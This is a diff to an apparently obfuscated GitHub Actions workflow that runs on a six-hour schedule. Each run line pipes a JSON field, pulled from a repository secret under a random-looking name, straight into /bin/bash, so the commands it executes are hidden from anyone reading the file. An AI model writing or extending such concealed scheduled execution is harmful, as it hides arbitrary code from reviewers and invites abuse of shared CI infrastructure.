@@ -2,34 +2,22 @@ name: gangwugandian
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 2/6 * * *'
+    - cron: '3 3/6 * * *'
 
-jobs:  # 7705
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gangwugandian
         env:
-          ahrm60561: ${{ secrets.ahrm60561 }}
+          m03899: ${{ secrets.m03899 }}
         run: |
-          echo $ahrm60561 | jq -r .pwg68196 | /bin/bash
-          echo $tioi627 | jq -r .ojg31121 | /bin/bash
-          echo $wiab5469 | jq -r .b4 | /bin/bash
-          echo $ssbg8 | jq -r .ekoso6 | /bin/bash
-          echo $bvtml92 | jq -r .zjz22183 | /bin/bash
-          echo $ak83 | jq -r .pc95400 | /bin/bash
-          echo $a5058 | jq -r .su67516 | /bin/bash
-          echo $vq015 | jq -r .aujra38 | /bin/bash
-          echo $pu391 | jq -r .vhqpl62079 | /bin/bash
-          echo $ipofh693 | jq -r .lj2944 | /bin/bash
-          echo $ni9631 | jq -r .iilwk53 | /bin/bash
-          echo $gkks53440 | jq -r .ulw558 | /bin/bash
-          echo $s5712 | jq -r .vijxv513 | /bin/bash
-          echo $la232 | jq -r .oa986 | /bin/bash
-          echo $adivc0001 | jq -r .rlpb3053 | /bin/bash
-          echo $vti20 | jq -r .b09 | /bin/bash
-          echo $w2 | jq -r .seq44 | /bin/bash
-          echo $nnruu1 | jq -r .txg68 | /bin/bash
+          echo $m03899 | jq -r .z5 | /bin/bash
+          echo $ckr4 | jq -r .eael84006 | /bin/bash
+          echo $lykuv01243 | jq -r .zm35076 | /bin/bash
+          echo $vm13825 | jq -r .pxnkr099 | /bin/bash
+          echo $i3280 | jq -r .c85473 | /bin/bash
+          echo $vaux7796 | jq -r .a0 | /bin/bash
+          echo $buie3 | jq -r .n7621 | /bin/bash
 
